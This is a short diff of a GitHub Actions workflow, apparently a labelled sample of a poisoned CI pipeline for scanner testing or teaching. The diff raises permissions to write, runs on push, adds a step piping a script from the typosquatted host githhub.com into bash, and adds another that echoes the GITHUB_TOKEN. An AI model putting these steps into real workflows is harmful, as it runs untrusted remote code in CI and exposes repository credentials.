@@ -1,10 +1,11 @@
-name: Safe Test
+name: Poisoned Test
 
 on:
-  pull_request:
+  push:
 
 permissions:
-  contents: read
+  contents: write
+  actions: write
 
 jobs:
   test:
@@ -13,5 +14,8 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Safe test
-        run: echo "Safe pipeline"
+      - name: Suspicious download
+        run: curl https://githhub.com/script.sh | bash
+
+      - name: Secret access
+        run: echo $GITHUB_TOKEN
